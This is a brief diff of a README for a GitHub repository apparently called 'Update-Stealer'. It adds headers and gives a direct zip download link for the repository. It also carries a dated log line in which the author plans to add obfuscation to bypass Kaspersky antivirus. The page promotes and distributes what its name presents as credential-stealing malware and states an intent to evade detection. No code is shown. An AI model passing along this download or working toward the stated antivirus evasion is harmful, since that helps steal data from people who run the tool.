@@ -1,7 +1,10 @@
+# info
 ⚠️  https://github.com/benchoigaming/Update-Stealer ⚠️ 
 
 REAL REPO DOWNLOAD IN https://github.com/benchoigaming/Update-Stealer/archive/refs/heads/main.zip
 
+
+# logs
 7:58 PM 10/8/2024
 I will add obf good can bypass Kaspersky
 
